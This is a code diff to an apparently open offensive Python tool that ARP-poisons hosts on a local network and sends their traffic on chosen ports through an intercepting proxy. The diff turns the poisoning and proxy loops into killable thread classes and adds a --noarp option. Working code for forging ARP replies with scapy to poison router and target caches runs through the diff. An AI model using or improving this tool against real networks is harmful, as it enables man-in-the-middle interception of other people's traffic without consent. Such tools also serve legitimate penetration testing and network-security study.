@@ -61,6 +61,7 @@ def main():
 	parser.add_argument('--router',  default=None,     metavar='<router>',  action='store', help="Local network gateway (default: autodetect)")
 	parser.add_argument('--iface',   default='eth0',   metavar='<iface>',   action='store', help="Network interface card to use (default: eth0)")
 	parser.add_argument('--nofw',    default=False,    action='store_true', help="Do not auto-configure routing and iptables rules (default: false)")
+	parser.add_argument('--noarp',   default=False,    action='store_true', help="Do not ARP poison (default: false)")
 	parser.add_argument('--freq',    default=5.0,      metavar='<freq>',    action='store', type=float, help="ARP poison packets frequency in seconds (default: 5)")
 	parser.add_argument('--ports',   default='80',     metavar='<ports>',   action='store', help="Comma seperated list of ports to intercept (default: 80)")
 	parser.add_argument('--proxy',   default=None,     metavar='<proxy>',   action='store', help="External proxy to forward clients' traffic to (format: ip:port)\n\n")
@@ -70,6 +71,8 @@ def main():
 	
 	config.init()
 	config.cfg.args = parser.parse_args()
+	arp_threads = []
+	proxy_threads = []
 	 
 	try:
 		config.cfg.args.local_ip = netinfo.get_ip(config.cfg.args.iface)
@@ -84,7 +87,6 @@ def main():
 	if config.cfg.args.router == None:
 		print "Error: could not detect default gateway"
 		sys.exit(0)
-
 
 	try:
 		config.cfg.args.levels = [int(x) for x in config.cfg.args.levels.split(',')]
@@ -128,11 +130,10 @@ def main():
 			sys.exit()
 	
 		print "[*] Starting proxy on  %s:%d..." % (config.cfg.args.local_ip, port)
-		#t = thread.start_new_thread(proxy_thread, (config.cfg.args.local_ip, port))
-		t0 = threading.Thread(target=proxy.proxy_thread, args=(config.cfg.args.local_ip, port))
-		t0.daemon = True
-		t0.start()
-
+		
+		t = proxy.ProxyThread(config.cfg.args.local_ip, port)
+		proxy_threads.append(t)
+		t.start()
 
 	# Configure iptables
 	if config.cfg.args.nofw == False:
@@ -147,48 +148,61 @@ def main():
 	config.cfg.clients = {}
 
 	# Start ARP poison thread
-	scapy_conf.iface = config.cfg.args.iface
-	t1 = threading.Thread(target=arp_poison_loop)
-	t1.daemon = True
-	t1.start()
+	if config.cfg.args.noarp == False:
+		scapy_conf.iface = config.cfg.args.iface
+
+		print "[*] Poisoning ARP caches..."
+		for addr in config.cfg.args.ip_list:
+			
+			# exclude myself and router
+			if addr in [config.cfg.my[0], config.cfg.router[0]]:
+				continue
+
+			t = ArpPoisonThread(addr)
+			arp_threads.append(t)
+			t.start()
 
 	try:
 		while 1:
 			time.sleep(1)
-	except:
-		t0.stopped = True
-		t1.stopped = True
+
+	except KeyboardInterrupt:
+		print "\r\nKilling ARP Poisoning threads..."
+		for t in arp_threads:
+			t.kill()
+
+		print "Killing Proxy threads..."
+		for t in proxy_threads:
+			t.server.shutdown()
+
 		clean_exit()
 
-def arp_poison_send(hwsrc, psrc, pdst):
-	if config.cfg.args.verbose:
-		print "\n>>> to: %-15s > ARP %-15s who-has %s" % (psrc, pdst, hwsrc),
+class ArpPoisonThread(threading.Thread):
+	def __init__(self, addr):
+		threading.Thread.__init__(self)
+		self.addr = addr
+		self.killed = False
 
-	packet = Ether()/ARP(op="who-has", hwsrc=hwsrc, psrc=psrc, pdst=pdst)
-	scapy_send(packet, verbose=0)
+	def run(self):
+		while not self.killed:
+			# Poison target's IP in router's cache
+			self.send(config.cfg.my[1], self.addr, config.cfg.router[0])
 
-def arp_poison_thread(addr):
-	while True:
-		# Poison target's IP in router's cache
-		arp_poison_send(config.cfg.my[1], addr, config.cfg.router[0])
+			# Poison router's IP in all targets caches
+			self.send(config.cfg.my[1], config.cfg.router[0], self.addr)
 
-		# Poison router's IP in all targets caches
-		arp_poison_send(config.cfg.my[1], config.cfg.router[0], addr)
+			# Sleep until next round
+			time.sleep(config.cfg.args.freq)
 
-		# Sleep until next round
-		time.sleep(config.cfg.args.freq)
+	def send(self, hwsrc, psrc, pdst):
+		if config.cfg.args.verbose:
+			print "\n>>> to: %-15s > ARP %-15s who-has %s" % (psrc, pdst, hwsrc),
 
-def arp_poison_loop():
-	print "[*] Poisoning ARP caches..."
-	for addr in config.cfg.args.ip_list:
-		
-		# exclude myself and router
-		if addr in [config.cfg.my[0], config.cfg.router[0]]:
-			continue
+		packet = Ether()/ARP(op="who-has", hwsrc=hwsrc, psrc=psrc, pdst=pdst)
+		scapy_send(packet, verbose=0)
 
-		t = threading.Thread(target=arp_poison_thread, args=(addr,))
-		t.daemon = True
-		t.start()
+	def kill(self):
+		self.killed = True
 
 def conf_ip_forward():
 
